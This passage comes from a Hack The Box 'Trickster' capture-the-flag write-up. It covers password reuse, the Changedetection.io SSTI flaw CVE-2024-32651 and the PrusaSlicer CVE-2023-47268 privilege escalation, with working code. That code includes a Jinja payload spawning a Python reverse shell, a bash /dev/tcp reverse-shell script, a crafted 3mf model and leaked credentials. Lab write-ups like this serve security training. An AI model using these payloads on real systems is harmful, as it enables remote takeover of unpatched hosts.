SF:next=/\r\nVary:\x20Accept-Encoding,\x20Cookie\r\nAccess-Control-Allow-O
SF:rigin:\x20\*\r\nSet-Cookie:\x20session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZXJy
SF:b3IiLCJZb3UgbXVzdCBiZSBsb2dnZWQgaW4sIHBsZWFzZSBsb2cgaW4uIl19XX0\.Z0qvkQ
SF:\.w0tZJTBPFnyGcvNuYntA8BcJLXU;\x20HttpOnly;\x20Path=/\r\nDate:\x20Sat,\
SF:x2030\x20Nov\x202024\x2006:24:17\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:<!doctype\x20html>\n<html\x20lang=en>\n<title>Redirecting\.\.\.</title>
SF:\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x20be\x20redirected\x20a
SF:utomatically\x20to\x20the\x20target\x20URL:\x20<a\x20href=\"/login\?nex
SF:t=/\">/login\?next=/</a>\.\x20If\x20not,\x20click\x20the\x20link\.\n")%
SF:r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML
SF:\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org/
SF:TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\"tex
SF:t/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x
SF:20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.
SF:</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\
SF:x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20un
SF:supported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(HTTPO
SF:ptions,D8,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/html;\x20cha
SF:rset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nVary:\x20Accept-Enc
SF:oding\r\nAccess-Control-Allow-Origin:\x20\*\r\nContent-Length:\x200\r\n
SF:Date:\x20Sat,\x2030\x20Nov\x202024\x2006:24:32\x20GMT\r\nConnection:\x2
SF:0close\r\n\r\n")%r(Help,1EF,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//D
SF:TD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www
SF:\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20con
SF:tent=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<tit
SF:le>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20
SF:<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20syntax\x20\('HELP'
SF:\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanati
SF:on:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x
SF:20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.66 seconds
```

When we connect to the service in a browser we are met with a simple login page. This confirms that the software is running Changedetection.io on port 5000.

![Screenshot](/assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-Writeup-HTB20241130012432.png)

### Web Service - Password Reuse

It appears that the James user's password was reused in setting up this service. The default login accepts the following password: `alwaysandforever`

![Screenshot](/assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-Writeup-HTB20241130013216.png)

With credentialed access we have the ability to further enumerate the instance and find any software versions for further research. It looks like the Changedetection.io instance is running the following version: 0.45.20

### CVE-2024-32651 - Changedetection.io 0.45.20 Server Side Template Injection

There is a vulnerablity in this version of Changedetection.io that results in arbitrary remote code execution through server side template injection detailed in CVE-2024-32651. 

For more detailed information on this vulnerability, the following blog post was a huge help:

<https://www.hacktivesecurity.com/blog/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/>

Create a check with the following parameters. Make sure you setup a Python HTTP server to handle the GET requests and host a file called test.txt which you will need to change text in regularly in order to trigger the notification workflow. Then put the malicious notification template pointed at a netcat listen to hear the post requests as shown.

![Screenshot](/assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-Writeup-HTB20241130015849.png)
![Screenshot](/assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-Writeup-HTB20241130015901.png)
![Screenshot](/assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-Writeup-HTB20241130015923.png)

**Reverse Shell Handler**

![Screenshot](/assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-Writeup-HTB20241130015702.png)

**Malicious Notification Body**

{% raw %} 
```jinja
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.6\",8088));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'").read()}}
{% endif %}
{% endfor %}     
```
{% endraw %}

**Full Exploit Workflow**

![Screenshot](/assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-Writeup-HTB20241130023123.png)

After performing the exploit chain we are granted a root user reverse shell on the Docker container that is running the Changedetection.io instance. From this shell we can enumerate more about the file system running on the container. As we change to the base root directory of the file system I noticed a curious `/datastore` directory which seems to contain a few interesting files.

```shell
root@a4b9a36ae7ff:/app# ls
ls
changedetection.py  changedetectionio
root@a4b9a36ae7ff:/app# cd /
cd /
root@a4b9a36ae7ff:/# ls
ls
app  boot       dev  home  lib64  mnt  proc  run   srv  tmp  var
bin  datastore  etc  lib   media  opt  root  sbin  sys  usr
root@a4b9a36ae7ff:/# cd datastore
cd datastore
root@a4b9a36ae7ff:/datastore# ls
ls
5c48e966-1bee-4782-b077-b259c5635727  secret.txt              url-list.txt
Backups                               url-list-with-tags.txt  url-watches.json
root@a4b9a36ae7ff:/datastore# cat secret.txt
cat secret.txt
5fce75c64d33acf05d2d3b21d29e693d992f240d5c440310cff3edfb743c64a5root@a4b9a36ae7ff:/datastore# 

root@a4b9a36ae7ff:/datastore#
```

These files can be copied off of the machine over the  network with Ncat before we lose our root shell.

![Screenshot](/assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-Writeup-HTB20241130024037.png)

### Datastore File Enumeration

We can begin by unzipping this backup file on the attacking machine for offline enumeration.

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster]
└─$ unzip changedetection-backup-20240830194841.zip 
Archive:  changedetection-backup-20240830194841.zip
   creating: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/
 extracting: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/f04f0732f120c0cc84a993ad99decb2c.txt.br  
 extracting: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/history.txt  
replace secret.txt? [y]es, [n]o, [A]ll, [N]one, [r]ename: r
new name: secret.other
  inflating: secret.other            
  inflating: url-list.txt            
  inflating: url-list-with-tags.txt  
  inflating: url-watches.json        
                                                                                       
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster]
└─$ ls
3mfFile                                    nmap
81062fb89228e0638acac454ba8c966e.txt       nmap.all
adam_key                                   nmap.port5000
b4a8b52d-651b-44bc-bbc6-f9e8c6590103       secret.other
changedetection-backup-20240830194841.zip  secret.txt
changedetection-backup-20240830202524.zip  shop.trickster.htb
custom_xss                                 TRICKSTER.3mf
cve-2024-32651                             url-list.txt
CVE-2024-32651-changedetection-RCE         url-list-with-tags.txt
CVE-2024-34716                             url-watches.json
f3792c4550b5deffc8b2901a332c753b.txt       web_service.dbout
history.txt                                web_service.hash
                                                                                       
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster]
└─$ cd b4a8b52d-651b-44bc-bbc6-f9e8c6590103 
                                                                                       
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
└─$ ls
f04f0732f120c0cc84a993ad99decb2c.txt.br  history.txt
```

The `.txt.br` file extension is an indicator that this has been compressed with the Brotli compression engine. This is not installed by default on Kali Linux but we can easily install this with `apt` and then decompress the text file to enumerate it's contents.

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
└─$ sudo apt install brotli               
[sudo] password for kali: 
Installing:                     
  brotli
                                                                                       
Summary:
  Upgrading: 0, Installing: 1, Removing: 0, Not Upgrading: 92
  Download size: 70.1 kB
  Space needed: 177 kB / 55.1 GB available
### SNIP ###
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
└─$ brotli -d f04f0732f120c0cc84a993ad99decb2c.txt.br
                                                                                       
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
└─$ cat f04f0732f120c0cc84a993ad99decb2c.txt
  This website requires JavaScript.
    Explore Help
    Register Sign In
                james/prestashop
              Watch 1
              Star 0
              Fork 0
                You've already forked prestashop
          Code Issues Pull Requests Actions Packages Projects Releases Wiki Activity
                main
          prestashop / app / config / parameters.php
            james 8ee5eaf0bb prestashop
            2024-08-30 20:35:25 +01:00

              64 lines
              3.1 KiB
              PHP

            Raw Permalink Blame History

                < ? php return array (                                                                                                                                 
                'parameters' =>                                                                                                                                        
                array (                                                                                                                                                
                'database_host' => '127.0.0.1' ,                                                                                                                       
                'database_port' => '' ,                                                                                                                                
                'database_name' => 'prestashop' ,                                                                                                                      
                'database_user' => 'adam' ,                                                                                                                            
                'database_password' => 'adam_admin992'
### SNIP ###
```

We find a set of credentials for the Adam user which appear to be a backup of the PrestaShop configuration file that we enumerated earlier. The following credentials can be used in an attempt to access other services on the target machine: `adam:adam_admin992`

## Adam User Shell Enumeration

When the discovered credentials are used on the SSH service on the target host we are granted with another user shell for the Adam user. Since we have the password of the user account the first check we will perform is for sudo permissions. It looks like the Adam user can execute `/opt/PrusaSlicer/prusaslicer` as root on this machine!

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
└─$ ssh adam@trickster             
adam@trickster's password: 
adam@trickster:~$ ls
adam@trickster:~$ whoami
adam
adam@trickster:~$ sudo -l
Matching Defaults entries for adam on trickster:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User adam may run the following commands on trickster:
    (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicer
adam@trickster:~$ 
```

### CVE-2023-47268 - PrusaSlicer 2.6.1 Arbitrary Code Execution

We can now revisit the CVE-2023-47268 vulnerability that was discussed earlier. Like we mentioned before, this exploit allows us to execute arbitrary code as the user running the slicer. It looks  like the intention behind this attack is to deliver a malicious 3D model to be sliced by an unsuspecting user. In that case you would execute code as the slicing user, but on this machine the Adam user can willingly slice as the root user. Because of this we can create a malicious 3D model and slice it as root, executing a reverse shell in the process. We will use the following ExploitDB entry to generate our malicious model:

<https://www.exploit-db.com/exploits/51983>

Find the blank post_process line that's already in the Slic3r_PE.config file and add a path to a malicious script in /tmp. Basic creation of the `TRICKSTER.3mf` is shown below. This is essentially a predefined directory structure that is just zipped up. We are specifically updating the `Metadata/Slic3r_PE_model.config` file and re-zipping the 3mf file.

![Screenshot](/assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-Writeup-HTB20241130024856.png)

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster/3mfFile]
└─$ ls
 3D  '[Content_Types].xml'   Metadata   _rels   TRICKSTER.3mf
                                                                                                                   
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster/3mfFile]
└─$ zip -r TRICKSTER.3mf ./*
updating: 3D/ (stored 0%)
updating: 3D/3dmodel.model (deflated 82%)
updating: [Content_Types].xml (deflated 45%)
updating: Metadata/ (stored 0%)
updating: Metadata/Slic3r_PE.config (deflated 69%)
updating: Metadata/thumbnail.png (deflated 1%)
updating: Metadata/Slic3r_PE_model.config (deflated 83%)
updating: _rels/ (stored 0%)
updating: _rels/.rels (deflated 47%)
                                                                                                                   
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster/3mfFile]
└─$ scp TRICKSTER.3mf adam@trickster:/tmp/
adam@trickster's password: 
TRICKSTER.3mf                                                                    100%  138KB   1.1MB/s   00:00    
```

Also, be sure to create a simple reverse shell script at `/tmp/rev.sh` to be executed by the 3D file upon slicing. This should look something like the following:

```shell
#!/bin/bash
/bin/sh -i >& /dev/tcp/10.10.14.6/4444 0>&1
```

**Full Exploitation Steps**

Below are the full exploitation steps. After we upload the `rev.sh` file and the `TRICKSTER.3mf` files to `/tmp`. Then we add execution rights to the shell script file and use sudo to invoke PrusaSlicer to slice the malicious 3mf file. This will produce some output, but it should eventually result in a reverse shell being returned to the attacking machine.

```shell
adam@trickster:~$ ls /tmp
Crashpad
rev.sh
snap-private-tmp
systemd-private-0107e8b142a84301adb95de1d4622140-apache2.service-jWBGQe
systemd-private-0107e8b142a84301adb95de1d4622140-ModemManager.service-SyD1Mo
systemd-private-0107e8b142a84301adb95de1d4622140-systemd-logind.service-aq56lt
systemd-private-0107e8b142a84301adb95de1d4622140-systemd-resolved.service-C4SEwf
systemd-private-0107e8b142a84301adb95de1d4622140-systemd-timesyncd.service-HYLa6G
TRICKSTER.3mf
vmware-root_801-4248614937
adam@trickster:~$ chmod +x /tmp/rev.sh
adam@trickster:~$ sudo /opt/PrusaSlicer/prusaslicer -s /tmp/TRICKSTER.3mf 
10 => Processing triangulated mesh
10 => Processing triangulated mesh
20 => Generating perimeters
20 => Generating perimeters
30 => Preparing infill
45 => Making infill
30 => Preparing infill
10 => Processing triangulated mesh
20 => Generating perimeters
45 => Making infill
10 => Processing triangulated mesh
30 => Preparing infill
20 => Generating perimeters
45 => Making infill
30 => Preparing infill
10 => Processing triangulated mesh
20 => Generating perimeters                                                                                           
45 => Making infill                                                                                                   
30 => Preparing infill                                                                                                
45 => Making infill                                                                                                   
65 => Searching support spots                                                                                         
65 => Searching support spots                                                                                         
65 => Searching support spots                                                                                         
65 => Searching support spots                                                                                         
65 => Searching support spots                                                                                         
69 => Alert if supports needed                                                                                        
print warning: Detected print stability issues:                                                                       
                                                                                                                      
Loose extrusions                                                                                                      
Shape-Sphere, Shape-Sphere, Shape-Sphere, Shape-Sphere                                                                

Collapsing overhang
Shape-Sphere, Shape-Sphere, Shape-Sphere, Shape-Sphere

Low bed adhesion
TRICKSTER.HTB, Shape-Sphere, Shape-Sphere, Shape-Sphere, Shape-Sphere

Consider enabling supports.
Also consider enabling brim.
88 => Estimating curled extrusions
88 => Estimating curled extrusions
88 => Estimating curled extrusions
88 => Estimating curled extrusions
88 => Estimating curled extrusions
88 => Generating skirt and brim
90 => Exporting G-code to /tmp/TRICKSTER.gcode
```

## Root Shell

We are returned a root shell from the target machine, as root slices the file and runs the maliicous code, spawning a reverse shell. From here we have gained access to the root flag and we can perform any necessary steps to create persistence in the environment.

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster/3mfFile]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.34] 60666
# whoami
root
# which python3
/usr/bin/python3
# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@trickster:/home/adam# 

root@trickster:/home/adam# export TERM=xterm-256color
export TERM=xterm-256color
root@trickster:/home/adam# 

root@trickster:/home/adam# ^Z
zsh: suspended  nc -nlvp 4444
                                                                                                                   
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster/3mfFile]
└─$ stty raw -echo;fg              
[1]  + continued  nc -nlvp 4444

root@trickster:/home/adam# 
root@trickster:/home/adam# 
root@trickster:/home/adam# cd 
root@trickster:~# ls
changedetection  root.txt  scripts  snap
root@trickster:~# cat root.txt
24361011eaea50d784c11b29d9808e79
root@trickster:~# 
```
